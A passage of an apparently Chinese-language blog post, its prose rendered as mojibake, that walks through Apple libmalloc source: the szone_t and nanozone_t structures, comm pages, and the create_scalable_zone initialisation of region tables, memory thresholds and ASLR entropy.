large_entry_cache_reserve_limit;</span><br><span class="line">	<span class="keyword">size_t</span>			large_entry_cache_bytes; <span class="comment">// total size of death row, bytes</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* flag and limits pertaining to altered malloc behavior for systems with</span><br><span class="line">	 large amounts of physical memory */</span></span><br><span class="line">	<span class="keyword">unsigned</span>  is_largemem;</span><br><span class="line">	<span class="keyword">unsigned</span>  large_threshold;</span><br><span class="line">	<span class="keyword">unsigned</span>  vm_copy_threshold;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* security cookie */</span></span><br><span class="line">	<span class="keyword">uintptr_t</span> cookie;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Initial region list */</span></span><br><span class="line">	<span class="keyword">region_t</span>			initial_tiny_regions[INITIAL_NUM_REGIONS];</span><br><span class="line">	<span class="keyword">region_t</span>			initial_small_regions[INITIAL_NUM_REGIONS];</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* The purgeable zone constructed by create_purgeable_zone() would like to hand off tiny and small</span><br><span class="line">	 * allocations to the default scalable zone. Record the latter as the "helper" zone here. */</span></span><br><span class="line">	<span class="keyword">struct</span> szone_s		*helper_zone;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">boolean_t</span>			flotsam_enabled;</span><br><span class="line">&#125; <span class="keyword">szone_t</span>;</span><br></pre></td></tr></table></figure>
<p><code>nano_zone_t</code>ä¸<code>malloc_zone_t</code>çš„å…³ç³»ç›¸åŒï¼Œå› ä¸º<code>nano_zone_t</code>çš„ç»“æ„ç›¸å¯¹ç®€å•ï¼Œå¯ä»¥å…ˆä»<code>nano_zone_t</code>å…¥æ‰‹ï¼Œç†è§£å…¶ä½¿ç”¨æ–¹æ³•ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> nanozone_s &#123;				<span class="comment">// vm_allocate()'d, so page-aligned to begin with.</span></span><br><span class="line">	<span class="keyword">malloc_zone_t</span>		basic_zone;		<span class="comment">// first page will be given read-only protection</span></span><br><span class="line">	<span class="keyword">uint8_t</span>			pad[PAGE_MAX_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">malloc_zone_t</span>)];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// remainder of structure is R/W (contains no function pointers)</span></span><br><span class="line">	<span class="comment">// page-aligned</span></span><br><span class="line">	<span class="keyword">struct</span> nano_meta_s		meta_data[NANO_MAG_SIZE][NANO_SLOT_SIZE]; <span class="comment">// max: NANO_MAG_SIZE cores x NANO_SLOT_SIZE slots for nano blocks &#123;16 .. 256&#125;</span></span><br><span class="line">	_malloc_lock_s			band_resupply_lock[NANO_MAG_SIZE];</span><br><span class="line">    <span class="keyword">uintptr_t</span>           band_max_mapped_baseaddr[NANO_MAG_SIZE];</span><br><span class="line">	<span class="keyword">size_t</span>			core_mapped_size[NANO_MAG_SIZE];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span>			debug_flags;</span><br><span class="line">	<span class="keyword">unsigned</span>			our_signature;</span><br><span class="line">	<span class="keyword">unsigned</span>			phys_ncpus;</span><br><span class="line">	<span class="keyword">unsigned</span>			logical_ncpus;</span><br><span class="line">	<span class="keyword">unsigned</span>			hyper_shift;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* security cookie */</span></span><br><span class="line">	<span class="keyword">uintptr_t</span>			cookie;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * The nano zone constructed by create_nano_zone() would like to hand off tiny, small, and large</span><br><span class="line">	 * allocations to the default scalable zone. Record the latter as the "helper" zone here.</span><br><span class="line">	 */</span></span><br><span class="line">	<span class="keyword">malloc_zone_t</span>		*helper_zone;</span><br><span class="line">&#125; <span class="keyword">nanozone_t</span>;</span><br></pre></td></tr></table></figure>
<p>åœ¨å®é™…çš„ä½¿ç”¨ä¸­ï¼Œä»£ç æ˜¯è¿™æ ·å†™çš„ã€‚è¯¦ç»†çš„<code>nano_zone</code>åˆ›å»ºï¼Œä¼šåœ¨ä¸‹æ–‡å‡ºç°ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span> SZONE_PAGED_SIZE	((sizeof(nanozone_t) + vm_page_size - <span class="number">1</span>) &amp; ~ (vm_page_size - <span class="number">1</span>))</span></span><br><span class="line"><span class="keyword">malloc_zone_t</span> *</span><br><span class="line">foo()&#123;</span><br><span class="line">	<span class="keyword">nanozone_t</span>	*nanozone;</span><br><span class="line">	nanozone = allocate_pages(<span class="literal">NULL</span>, SZONE_PAGED_SIZE, <span class="number">0</span>, <span class="number">0</span>, VM_MEMORY_MALLOC);</span><br><span class="line">	<span class="comment">/*å¯¹nano_zoneè¿›è¡Œå¤„ç†ï¼Œè®¾ç½®å†…éƒ¨æ•°æ®*/</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">malloc_zone_t</span> *)nanozone; <span class="comment">//å¼ºåˆ¶è½¬æ¢æŒ‡é’ˆç±»å‹ï¼Œå¤–éƒ¨ç»“æ„åªèƒ½é€šè¿‡malloc_zone_tçš„æ®Šç»ç»“æ„æ¥è°ƒç”¨malloc_zone_tä¸­çš„ä¸€äº›å‡½æ•°ï¼Œæ¥æ¥è¿›è¡Œæ•°æ®å¤„ç†ã€‚</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="create_scalable_zone">create_scalable_zone</h3><p>è¯¥å‡½æ•°å®ç°äº†helper_zoneçš„åˆ›å»ºä»¥åŠç›¸å…³æ•°æ®çš„åˆå§‹åŒ–ã€‚</p>
<h4 id="comm_pages">comm pages</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// * The shared kernel/user "comm page(s)":</span></span><br><span class="line"> <span class="comment">//*</span></span><br><span class="line"> <span class="comment">//* The last several pages of every address space are reserved for the kernel/user</span></span><br><span class="line"> <span class="comment">//* "comm area". During system initialization, the kernel populates the comm pages with</span></span><br><span class="line"> <span class="comment">//* code customized for the particular processor and platform</span></span><br></pre></td></tr></table></figure>
<p><code>comm pages</code>æ˜¯ç³»ç»Ÿåˆå§‹åŒ–æ—¶åˆ›å»ºçš„ä¸€å—å…±äº«çš„å†…å­˜åŒºåŸŸï¼Œä¿å­˜äº†ä¸€äº›ç³»ç»Ÿçš„æ•°æ®ã€‚åœ¨<code>libmalloc</code>ä¸­æœ‰ä¸å°‘åœ°æ–¹éƒ½ç”¨åˆ°äº†<code>comm pages</code>æ¥è·å–ç³»ç»Ÿçš„å±æ€§ã€‚</p>
<h4 id="æºç æ³¨é‡Š">æºç æ³¨é‡Š</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">malloc_zone_t</span> *</span><br><span class="line">create_scalable_zone(<span class="keyword">size_t</span> initial_size, <span class="keyword">unsigned</span> debug_flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">szone_t</span>	*szone;</span><br><span class="line">	<span class="keyword">uint64_t</span>	hw_memsize = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//åˆ¤æ–­comm pageçš„ç‰ˆæœ¬æ˜¯å¦ç¬¦åˆè¦æ±‚</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> defined(__i386__) || defined(__x86_64__)</span></span><br><span class="line">	<span class="keyword">if</span> (_COMM_PAGE_VERSION_REQD &gt; (*((<span class="keyword">uint16_t</span> *)_COMM_PAGE_VERSION))) &#123;</span><br><span class="line">		malloc_printf(<span class="string">"*** ERROR - comm page version mismatch.\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(-<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* get memory for the zone. */</span></span><br><span class="line">	<span class="comment">//ä»å†…æ ¸ä¸­è·å–äº†å†…å­˜ç©ºé—´ï¼Œå¯¹åº”szoneçš„å¤§å°ï¼Œå› ä¸ºä¸€äº›è°ƒè¯•å‚æ•°çš„ä¸åŒï¼Œå†…å­˜çš„å¸ƒå±€å¯èƒ½ä¼šä¸åŒã€‚</span></span><br><span class="line">	<span class="comment">// #define SZONE_PAGED_SIZE		round_page_quanta((sizeof(szone_t))) </span></span><br><span class="line">	<span class="comment">// SZONE_PAGED_SIZE æ˜¯szone_tçš„å¤§å°æ ¹æ®pageå¤§å°å¯¹é½ä¹‹åçš„å¤§å°</span></span><br><span class="line">	szone = allocate_pages(<span class="literal">NULL</span>, SZONE_PAGED_SIZE, <span class="number">0</span>, <span class="number">0</span>, VM_MEMORY_MALLOC);</span><br><span class="line">	<span class="keyword">if</span> (!szone)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* set up the szone structure */</span></span><br><span class="line">	<span class="comment">// è°ƒè¯•ä¿¡æ¯çš„è®¾ç½®ä»¥åŠè°ƒè¯•æ—¥å¿—çš„è®¾ç½®</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> <span class="number">0</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">warning</span> CHECK_REGIONS enabled</span></span><br><span class="line">	debug_flags |= CHECK_REGIONS;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> <span class="number">0</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">warning</span> LOG enabled</span></span><br><span class="line">	szone-&gt;log_address = ~<span class="number">0</span>;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">//zoneä¸­ä¸tinyç›¸å…³çš„æ•°æ®åˆå§‹åŒ–</span></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">		typedef struct region_hash_generation &#123;</span><br><span class="line">			size_t		num_regions_allocated;</span><br><span class="line">			size_t		num_regions_allocated_shift; // log2(num_regions_allocated)</span><br><span class="line">			region_t		*hashed_regions;  // hashed by location</span><br><span class="line">			struct		region_hash_generation *nextgen;</span><br><span class="line">		&#125; region_hash_generation_t;</span><br><span class="line">	*/</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">/*</span><br><span class="line">		...</span><br><span class="line">		_malloc_lock_s				tiny_regions_lock CACHE_ALIGN;</span><br><span class="line">		size_t						num_tiny_regions;</span><br><span class="line">		size_t						num_tiny_regions_dealloc;</span><br><span class="line">		region_hash_generation_t	*tiny_region_generation;</span><br><span class="line">		region_hash_generation_t	trg[2];</span><br><span class="line"></span><br><span class="line">		int					num_tiny_magazines;</span><br><span class="line">		unsigned			num_tiny_magazines_mask;</span><br><span class="line">		int					num_tiny_magazines_mask_shift;</span><br><span class="line">		magazine_t			*tiny_magazines; // array of per-processor magazines</span><br><span class="line"></span><br><span class="line">		uintptr_t			last_tiny_advise;</span><br><span class="line">		...</span><br><span class="line">	*/</span></span><br><span class="line">	szone-&gt;trg[<span class="number">0</span>].nextgen = &amp;(szone-&gt;trg[<span class="number">1</span>]);</span><br><span class="line">	szone-&gt;trg[<span class="number">1</span>].nextgen = &amp;(szone-&gt;trg[<span class="number">0</span>]);</span><br><span class="line">	szone-&gt;tiny_region_generation = &amp;(szone-&gt;trg[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	szone-&gt;tiny_region_generation-&gt;hashed_regions = szone-&gt;initial_tiny_regions;</span><br><span class="line">	szone-&gt;tiny_region_generation-&gt;num_regions_allocated = INITIAL_NUM_REGIONS;</span><br><span class="line">	szone-&gt;tiny_region_generation-&gt;num_regions_allocated_shift = INITIAL_NUM_REGIONS_SHIFT;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/*</span><br><span class="line">		åˆå§‹åŒ–ä¹‹åæ•°ç›¸å…³æ•°æ®ç»“æ„å¦‚ä¸‹</span><br><span class="line">----------------------------------</span><br><span class="line">|num_tiny_regions                |</span><br><span class="line">----------------------------------</span><br><span class="line">|num_tiny_regions_dealloc        |</span><br><span class="line">----------------------------------												 </span><br><span class="line">|tiny_region_generation = &amp;trg[0]| </span><br><span class="line">----------------------------------      --------------------------------------------------------- </span><br><span class="line">|trg[0]                          |------|num_regions_allocated = INITIAL_NUM_REGIONS            |&lt;-----</span><br><span class="line">----------------------------------      ---------------------------------------------------------     |</span><br><span class="line">|trg[1]                          |---   |num_regions_allocated_shift = INITIAL_NUM_REGIONS_SHIFT|     |</span><br><span class="line">---------------------------------|  |   ---------------------------------------------------------     |</span><br><span class="line">|num_tiny_magazines              |  |   |hashed_regionsr = initial_tiny_regions                 |=====|=====</span><br><span class="line">----------------------------------  |   ---------------------------------------------------------     |   ||</span><br><span class="line">|num_tiny_magazines_mask         |  |   |nextgen = &amp;trg[1]                                      |---  |   ||</span><br><span class="line">----------------------------------  |   ---------------------------------------------------------  |  |   ||</span><br><span class="line">|num_tiny_magazines_mask_shift   |  |   ---------------------------------------------------------  |  |   ||</span><br><span class="line">----------------------------------  ----|num_regions_allocated = 0                              |&lt;--  |   ||  </span><br><span class="line">|tiny_magazines                  |      ---------------------------------------------------------     |   ||  </span><br><span class="line">----------------------------------      |num_regions_allocated_shift = 0                        |     |   ||  </span><br><span class="line">|last_tiny_advise                |      ---------------------------------------------------------     |   ||</span><br><span class="line">----------------------------------      |hashed_regions = NULL                                  |     |   ||</span><br><span class="line">|initial_tiny_regions            |&lt;===  ---------------------------------------------------------     |   ||</span><br><span class="line">----------------------------------  ||  |nextgen = &amp;trg[0]                                      |------   ||</span><br><span class="line">                                    ||  ---------------------------------------------------------         ||</span><br><span class="line">                                    =======================================================================	</span><br><span class="line">												</span><br><span class="line">	*/</span></span><br><span class="line">	<span class="comment">//zoneä¸­ä¸smallç›¸å…³çš„æ•°æ®åˆå§‹åŒ–</span></span><br><span class="line">	szone-&gt;srg[<span class="number">0</span>].nextgen = &amp;(szone-&gt;srg[<span class="number">1</span>]);</span><br><span class="line">	szone-&gt;srg[<span class="number">1</span>].nextgen = &amp;(szone-&gt;srg[<span class="number">0</span>]);</span><br><span class="line">	szone-&gt;small_region_generation = &amp;(szone-&gt;srg[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	szone-&gt;small_region_generation-&gt;hashed_regions = szone-&gt;initial_small_regions;</span><br><span class="line">	szone-&gt;small_region_generation-&gt;num_regions_allocated = INITIAL_NUM_REGIONS;</span><br><span class="line">	szone-&gt;small_region_generation-&gt;num_regions_allocated_shift = INITIAL_NUM_REGIONS_SHIFT;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//åˆå§‹åŒ–ä¹‹åå®Œå…¨ä¸tinyç›¸åŒï¼Œåªæ˜¯å˜é‡ä¸åŒã€‚</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * Initialize variables that size the free list for SMALL allocations based</span><br><span class="line">	 * upon the amount of memory in the system.  Switch to a larger number of</span><br><span class="line">	 * free list entries at 1GB.</span><br><span class="line">	 */</span></span><br><span class="line">	<span class="comment">// åˆå§‹åŒ–ä¸€äº›å˜é‡ï¼Œæ ¹æ®ç³»ç»Ÿä¸­çš„å†…å­˜çš„ç”¨é‡æ¥è®¡ç®—SMALLåˆ†é…åˆ—è¡¨çš„å¤§å°æ—¶å°†ä¼šç”¨åˆ°è¿™äº›å˜é‡ã€‚</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// * The shared kernel/user "comm page(s)":</span></span><br><span class="line"> <span class="comment">//*</span></span><br><span class="line"> <span class="comment">//* The last several pages of every address space are reserved for the kernel/user</span></span><br><span class="line"> <span class="comment">//* "comm area". During system initialization, the kernel populates the comm pages with</span></span><br><span class="line"> <span class="comment">//* code customized for the particular processor and platform.</span></span><br><span class="line"> <span class="comment">//*1073741824</span></span><br><span class="line"> <span class="comment">//* Because Mach VM cannot map the last page of an address space, we don't use it</span></span><br><span class="line"> <span class="comment">//</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">//----------æ ¹æ®æ˜¯å¦éœ€è¦ä½¿ç”¨largeï¼Œåšå‡ºä¸åŒçš„åˆå§‹åŒ–---------------start-------------</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> defined(__i386__) || defined(__x86_64__) || defined(__arm__) || defined(__arm64__)</span></span><br><span class="line">	<span class="keyword">if</span> ((hw_memsize = *(<span class="keyword">uint64_t</span> *)(<span class="keyword">uintptr_t</span>)_COMM_PAGE_MEMORY_SIZE) &gt;= (<span class="number">1U</span>LL &lt;&lt; <span class="number">30</span>))</span><br><span class="line"><span class="preprocessor">#<span class="keyword">else</span></span></span><br><span class="line">		<span class="keyword">size_t</span>	uint64_t_size = <span class="keyword">sizeof</span>(hw_memsize);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="number">0</span> == sysctlbyname(<span class="string">"hw.memsize"</span>, &amp;hw_memsize, &amp;uint64_t_size, <span class="number">0</span>, <span class="number">0</span>) &amp;&amp;</span><br><span class="line">		hw_memsize &gt;= (<span class="number">1U</span>LL &lt;&lt; <span class="number">30</span>))</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">	&#123;</span><br><span class="line">		szone-&gt;is_largemem = <span class="number">1</span>;</span><br><span class="line">		szone-&gt;num_small_slots = NUM_SMALL_SLOTS_LARGEMEM;</span><br><span class="line">		szone-&gt;large_threshold = LARGE_THRESHOLD_LARGEMEM;</span><br><span class="line">		szone-&gt;vm_copy_threshold = VM_COPY_THRESHOLD_LARGEMEM;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		szone-&gt;is_largemem = <span class="number">0</span>;</span><br><span class="line">		szone-&gt;num_small_slots = NUM_SMALL_SLOTS;</span><br><span class="line">		szone-&gt;large_threshold = LARGE_THRESHOLD;</span><br><span class="line">		szone-&gt;vm_copy_threshold = VM_COPY_THRESHOLD;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> LARGE_CACHE</span></span><br><span class="line">	szone-&gt;large_entry_cache_reserve_limit =</span><br><span class="line">	hw_memsize &gt;&gt; <span class="number">10</span>; <span class="comment">// madvise(..., MADV_REUSABLE) death-row arrivals above this threshold [~0.1%]</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* &lt;rdar://problem/6610904&gt; Reset protection when returning a previous large allocation? */</span></span><br><span class="line">	<span class="keyword">int32_t</span> libSystemVersion  = NSVersionOfLinkTimeLibrary(<span class="string">"System"</span>);</span><br><span class="line">	<span class="keyword">if</span> ((-<span class="number">1</span> != libSystemVersion) &amp;&amp; ((libSystemVersion &gt;&gt; <span class="number">16</span>) &lt; <span class="number">112</span>) <span class="comment">/* CFSystemVersionSnowLeopard */</span>)</span><br><span class="line">		szone-&gt;large_legacy_reset_mprotect = TRUE;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		szone-&gt;large_legacy_reset_mprotect = FALSE;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">//----------æ ¹æ®æ˜¯å¦éœ€è¦ä½¿ç”¨largeï¼Œåšå‡ºä¸åŒçš„åˆå§‹åŒ–---------------end----------------</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Prepare ASLR</span></span><br><span class="line">	<span class="comment">// ---------å¤„ç†ASLRç›¸å…³çš„å†…å®¹---------------------------------start---------------</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> __i386__ || __x86_64__ || __arm64__ || TARGET_OS_EMBEDDED</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> __i386__</span></span><br><span class="line">	<span class="keyword">uintptr_t</span> stackbase = <span class="number">0x8fe00000</span>;</span><br><span class="line">	<span class="keyword">int</span> entropic_bits = <span class="number">3</span>;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">elif</span> __x86_64__</span></span><br><span class="line">	<span class="keyword">uintptr_t</span> stackbase = USRSTACK64;</span><br><span class="line">	<span class="keyword">int</span> entropic_bits = <span class="number">16</span>;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">elif</span> __arm64__</span></span><br><span class="line">	<span class="keyword">uintptr_t</span> stackbase = USRSTACK64;</span><br><span class="line">	<span class="keyword">int</span> entropic_bits = <span class="number">7</span>;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">else</span></span></span><br><span class="line">	<span class="keyword">uintptr_t</span> stackbase = USRSTACK;</span><br><span class="line">	<span class="keyword">int</span> entropic_bits = <span class="number">3</span>;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// assert(((1 &lt;&lt; entropic_bits) - 1) &lt;&lt; SMALL_BLOCKS_ALIGN &lt; (stackbase - MAXSSIZ - ENTROPIC_KABILLION));</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="number">0</span> != _dyld_get_image_slide((<span class="keyword">const</span> <span class="keyword">struct</span> mach_header*)_NSGetMachExecuteHeader())) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="number">0</span> == entropic_address) &#123;</span><br><span class="line">			<span class="keyword">uintptr_t</span> t = stackbase - MAXSSIZ - ((<span class="keyword">uintptr_t</span>) (malloc_entropy[<span class="number">1</span>] &amp; ((<span class="number">1</span> &lt;&lt; entropic_bits) - <span class="number">1</span>)) &lt;&lt; SMALL_BLOCKS_ALIGN);</span><br><span class="line">			(<span 